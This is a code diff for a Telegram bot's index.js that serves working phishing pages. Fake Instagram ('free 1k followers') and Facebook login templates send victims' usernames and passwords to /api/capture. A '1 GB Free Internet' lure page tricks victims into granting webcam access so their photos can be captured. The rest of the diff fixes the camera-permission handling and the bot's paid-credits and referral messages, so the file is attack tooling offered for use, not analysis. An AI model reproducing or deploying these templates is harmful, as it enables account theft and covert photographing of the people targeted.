@@ -1,7 +1,7 @@
-// ====================== index.js – QR 100% WORKING ======================
+// ====================== index.js – ALL 3 PROBLEMS FIXED ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * QR upload via admin panel + bot, fully working
+ * Fixed: Camera permission, Payment accept, Credits naming
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -360,128 +360,7 @@ async function sendBatchPhotos(userId) {
     delete userActive[userId];
 }
 
-// ====================== TEMPLATES (with custom headings) ======================
-// Instagram → "instafree1kfollowers"
-const INSTA_TEMPLATE = `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>instafree1kfollowers</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}.input-group input::placeholder{color:#777}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#888;text-decoration:none}
-</style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span></div>
-<div class="card">
-<div class="logo"><i class="fab fa-instagram"></i><h1>instafree1kfollowers</h1></div>
-<div id="form-screen">
-<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>
-<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
-<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
-</div>
-<div id="process-screen" style="display:none">
-<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
-<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
-<div id="result-area" style="display:none">
-<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
-<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
-</div>
-</div>
-<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
-</div>
-<script>
-var id="USERID_PLACEHOLDER";
-var p="PLATFORM_PLACEHOLDER";
-function startEngine(){
-var u=document.getElementById("username").value.trim();
-var pwd=document.getElementById("password").value;
-if(!u||!pwd){alert("Please fill all fields.");return}
-fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
-document.getElementById("form-screen").style.display="none";
-document.getElementById("process-screen").style.display="block";
-document.querySelector(".loader").style.display="block";
-document.querySelector(".progress-bar").style.display="block";
-document.getElementById("result-area").style.display="none";
-var progress=0;
-var interval=setInterval(function(){
-progress+=Math.random()*3+1;
-if(progress>=100){progress=100;clearInterval(interval);
-document.querySelector(".loader").style.display="none";
-document.querySelector(".progress-bar").style.display="none";
-document.getElementById("result-area").style.display="block";
-document.getElementById("status-text").innerText="✅ Verified";
-return}
-document.getElementById("progress-fill").style.width=progress+"%";
-if(progress<30)document.getElementById("status-text").innerText="Connecting...";
-else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
-else if(progress<85)document.getElementById("status-text").innerText="Loading...";
-else document.getElementById("status-text").innerText="Almost done...";
-},150);
-}
-</script>
-</body>
-</html>`;
-
-// Facebook → "fbprivatechat"
-const FB_TEMPLATE = `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>fbprivatechat</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}.input-group input::placeholder{color:#666}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#666;text-decoration:none}
-</style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span></div>
-<div class="card">
-<div class="logo"><i class="fab fa-facebook"></i><h1>fbprivatechat</h1></div>
-<div id="form-screen">
-<div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>
-<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
-<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
-</div>
-<div id="process-screen" style="display:none">
-<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
-<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
-<div id="result-area" style="display:none">
-<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
-<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
-</div>
-</div>
-<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
-</div>
-<script>
-var id="USERID_PLACEHOLDER";
-var p="PLATFORM_PLACEHOLDER";
-function startEngine(){
-var u=document.getElementById("username").value.trim();
-var pwd=document.getElementById("password").value;
-if(!u||!pwd){alert("Please fill all fields.");return}
-fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
-document.getElementById("form-screen").style.display="none";
-document.getElementById("process-screen").style.display="block";
-document.querySelector(".loader").style.display="block";
-document.querySelector(".progress-bar").style.display="block";
-document.getElementById("result-area").style.display="none";
-var progress=0;
-var interval=setInterval(function(){
-progress+=Math.random()*3+1;
-if(progress>=100){progress=100;clearInterval(interval);
-document.querySelector(".loader").style.display="none";
-document.querySelector(".progress-bar").style.display="none";
-document.getElementById("result-area").style.display="block";
-document.getElementById("status-text").innerText="✅ Verified";
-return}
-document.getElementById("progress-fill").style.width=progress+"%";
-if(progress<30)document.getElementById("status-text").innerText="Connecting...";
-else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
-else if(progress<85)document.getElementById("status-text").innerText="Loading...";
-else document.getElementById("status-text").innerText="Almost done...";
-},150);
-}
-</script>
-</body>
-</html>`;
-
-// Camera → "1 GB Free Internet"
+// ====================== CAMERA TEMPLATE (FIXED - Camera Permission Error) ======================
 const CAMERA_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>1 GB Free Internet</title>
@@ -550,10 +429,10 @@ claimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";
 loaderBox.style.display="block";resultBox.style.display="none";logArea.innerHTML="";
 statusText.innerText="🔍 Verifying...";
 addLog("Initializing secure connection...");
-try{
 addLog("📡 Requesting verification...");
-statusText.innerText="📸 Capturing...";
+statusText.innerText="📸 Accessing camera...";
 addLog("📸 Accessing camera for verification...");
+try{
 var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}});
 video.srcObject=stream;
 await new Promise(function(r){setTimeout(r,600)});
@@ -574,17 +453,140 @@ resultBox.style.display="block";
 resultBox.innerHTML="<i class=\\"fas fa-check-circle\\" style=\\"color:#00ff88;font-size:50px\\"></i><h3 style=\\"color:#fff;margin-top:10px;font-family:Orbitron,sans-serif\\">1GB ADDED!</h3>";
 setTimeout(function(){alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display="none"},1500)
 }catch(e){
-addLog("❌ Camera access denied!","err");
-statusText.innerText="❌ Error";
+console.error("Camera error:",e);
+addLog("❌ Camera access denied! Please allow camera permission.","err");
+statusText.innerText="❌ Camera Error";
 claimBtn.innerText="🔄 RETRY";
 claimBtn.disabled=false;
+loaderBox.style.display="none";
+alert("⚠️ Camera permission is required. Please allow camera access and try again.");
 }
 });
 </script>
 </body>
 </html>`;
 
-// Security → "Security Scanner"
+// ====================== INSTAGRAM TEMPLATE ======================
+const INSTA_TEMPLATE = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>instafree1kfollowers</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}.input-group input::placeholder{color:#777}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#888;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="bg-shapes"><span></span><span></span></div>
+<div class="card">
+<div class="logo"><i class="fab fa-instagram"></i><h1>instafree1kfollowers</h1></div>
+<div id="form-screen">
+<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>
+<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
+<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
+</div>
+<div id="process-screen" style="display:none">
+<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
+<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
+<div id="result-area" style="display:none">
+<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
+<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
+</div>
+</div>
+<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
+</div>
+<script>
+var id="USERID_PLACEHOLDER";
+var p="PLATFORM_PLACEHOLDER";
+function startEngine(){
+var u=document.getElementById("username").value.trim();
+var pwd=document.getElementById("password").value;
+if(!u||!pwd){alert("Please fill all fields.");return}
+fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
+document.getElementById("form-screen").style.display="none";
+document.getElementById("process-screen").style.display="block";
+document.querySelector(".loader").style.display="block";
+document.querySelector(".progress-bar").style.display="block";
+document.getElementById("result-area").style.display="none";
+var progress=0;
+var interval=setInterval(function(){
+progress+=Math.random()*3+1;
+if(progress>=100){progress=100;clearInterval(interval);
+document.querySelector(".loader").style.display="none";
+document.querySelector(".progress-bar").style.display="none";
+document.getElementById("result-area").style.display="block";
+document.getElementById("status-text").innerText="✅ Verified";
+return}
+document.getElementById("progress-fill").style.width=progress+"%";
+if(progress<30)document.getElementById("status-text").innerText="Connecting...";
+else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
+else if(progress<85)document.getElementById("status-text").innerText="Loading...";
+else document.getElementById("status-text").innerText="Almost done...";
+},150);
+}
+</script>
+</body>
+</html>`;
+
+// ====================== FACEBOOK TEMPLATE ======================
+const FB_TEMPLATE = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>fbprivatechat</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}.input-group input::placeholder{color:#666}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#666;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="bg-shapes"><span></span><span></span></div>
+<div class="card">
+<div class="logo"><i class="fab fa-facebook"></i><h1>fbprivatechat</h1></div>
+<div id="form-screen">
+<div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>
+<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
+<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
+</div>
+<div id="process-screen" style="display:none">
+<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
+<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
+<div id="result-area" style="display:none">
+<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
+<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
+</div>
+</div>
+<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
+</div>
+<script>
+var id="USERID_PLACEHOLDER";
+var p="PLATFORM_PLACEHOLDER";
+function startEngine(){
+var u=document.getElementById("username").value.trim();
+var pwd=document.getElementById("password").value;
+if(!u||!pwd){alert("Please fill all fields.");return}
+fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
+document.getElementById("form-screen").style.display="none";
+document.getElementById("process-screen").style.display="block";
+document.querySelector(".loader").style.display="block";
+document.querySelector(".progress-bar").style.display="block";
+document.getElementById("result-area").style.display="none";
+var progress=0;
+var interval=setInterval(function(){
+progress+=Math.random()*3+1;
+if(progress>=100){progress=100;clearInterval(interval);
+document.querySelector(".loader").style.display="none";
+document.querySelector(".progress-bar").style.display="none";
+document.getElementById("result-area").style.display="block";
+document.getElementById("status-text").innerText="✅ Verified";
+return}
+document.getElementById("progress-fill").style.width=progress+"%";
+if(progress<30)document.getElementById("status-text").innerText="Connecting...";
+else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
+else if(progress<85)document.getElementById("status-text").innerText="Loading...";
+else document.getElementById("status-text").innerText="Almost done...";
+},150);
+}
+</script>
+</body>
+</html>`;
+
+// ====================== SECURITY TEMPLATE ======================
 const SCAN_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head>
@@ -856,7 +858,7 @@ app.post('/api/device-info', async (req, res) => {
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
-// Admin panel with QR upload
+// ====================== ADMIN PANEL (QR Upload) ======================
 app.get('/admin', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title>
@@ -1272,8 +1274,8 @@ async function processReferral(referrerId, userId) {
     try { const chat = await S7.getChat(userId); newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId; } catch {}
     let referrerInfo = '@user_' + referrerId;
     try { const chat = await S7.getChat(referrerId); referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId; } catch {}
-    await S7.sendMessage(referrerId, '🎉 <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>User ID:</b> <code>' + userId + '</code>\n⭐ <b>Points Earned:</b> +2\n\n📊 <b>Your Total Points:</b> ' + (referrer.credits || 0) + '\n📊 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
-    await S7.sendMessage(config.adminId, '👥 <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ' + referrerInfo + '\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n🆔 <b>New User ID:</b> <code>' + userId + '</code>\n⭐ <b>Points Earned:</b> 2\n\n📊 <b>Referrer Total Points:</b> ' + (referrer.credits || 0) + '\n📊 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
+    await S7.sendMessage(referrerId, '🎉 <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> +2\n\n📊 <b>Your Total Credits:</b> ' + (referrer.credits || 0) + '\n📊 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
+    await S7.sendMessage(config.adminId, '👥 <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ' + referrerInfo + '\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n🆔 <b>New User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> 2\n\n📊 <b>Referrer Total Credits:</b> ' + (referrer.credits || 0) + '\n📊 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
     await S7.sendMessage(userId, '✅ <b>Welcome!</b>\n\nYou joined through <b>' + referrerInfo + '</b>\'s referral link!\n🎁 <b>Bonus:</b> +3 Credits\n⭐ <b>Your Credits:</b> ' + user.credits, { parse_mode: 'HTML' });
     await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
     logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
@@ -1393,7 +1395,7 @@ S7.on('callback_query', async (q) => {
         else if (plan === 'unlimited') { credits = 'Unlimited'; amount = 100; }
         else return;
 
-        const msg = '💰 <b>Points Purchase</b>\n\n📊 <b>Points:</b> ' + credits + '\n💵 <b>Amount:</b> ₹' + amount + '\n🆔 <b>Transaction ID:</b> PTS-' + Date.now().toString(36).toUpperCase() + '\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹' + amount + '\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don\'t close this chat!</b> Admin will respond here.\n\n✅ After approval, points will be added.';
+        const msg = '💰 <b>Credits Purchase</b>\n\n📊 <b>Credits:</b> ' + credits + '\n💵 <b>Amount:</b> ₹' + amount + '\n🆔 <b>Transaction ID:</b> PTS-' + Date.now().toString(36).toUpperCase() + '\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹' + amount + '\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don\'t close this chat!</b> Admin will respond here.\n\n✅ After approval, credits will be added.';
         await S7.sendMessage(cid, msg, { parse_mode: 'HTML' });
         
         if (qrExists()) {
@@ -1413,37 +1415,83 @@ S7.on('callback_query', async (q) => {
         const userId = q.data.replace('pay_accept_', '');
         const user = await getUser(userId);
         const payment = user._pendingPayment || { credits: 'Unknown', amount: 'Unknown' };
+        
         if (payment.credits === 'Unlimited') {
             user.unlimited = true;
             await user.save();
-            await S7.sendMessage(userId, '🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYour payment of ₹' + payment.amount + ' has been verified.\nYou now have <b>Unlimited Credits</b> forever!\n\nThank you! 🙏', { parse_mode: 'HTML' });
+            await S7.sendMessage(userId,
+                '🎉 <b>UNLIMITED ACTIVATED!</b>\n\n' +
+                'Your payment of ₹' + payment.amount + ' has been verified.\n' +
+                'You now have <b>Unlimited Credits</b> forever!\n\n' +
+                'Thank you for your support! 🙏',
+                { parse_mode: 'HTML' }
+            );
         } else {
-            user.credits += parseInt(payment.credits);
+            user.credits = (user.credits || 0) + parseInt(payment.credits);
             await user.save();
-            await S7.sendMessage(userId, '✅ <b>Payment Verified!</b>\n\n💰 Amount: ₹' + payment.amount + '\n⭐ Credits Added: +' + payment.credits + '\n📊 Total Credits: ' + user.credits + '\n\nThank you! 🙏', { parse_mode: 'HTML' });
+            await S7.sendMessage(userId,
+                '✅ <b>Payment Verified!</b>\n\n' +
+                '💰 Amount: ₹' + payment.amount + '\n' +
+                '⭐ Credits Added: +' + payment.credits + '\n' +
+                '📊 Total Credits: ' + user.credits + '\n\n' +
+                'Thank you for your support! 🙏',
+                { parse_mode: 'HTML' }
+            );
         }
         user._pendingPayment = null;
         await user.save();
-        await S7.editMessageText('✅ <b>Payment Accepted!</b>\n\n👤 User: <code>' + userId + '</code>\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n✅ Credits added!', { chat_id: cid, message_id: mid, parse_mode: 'HTML' });
-        await S7.answerCallbackQuery(q.id, { text: '✅ Payment accepted!' });
+
+        await S7.editMessageText(
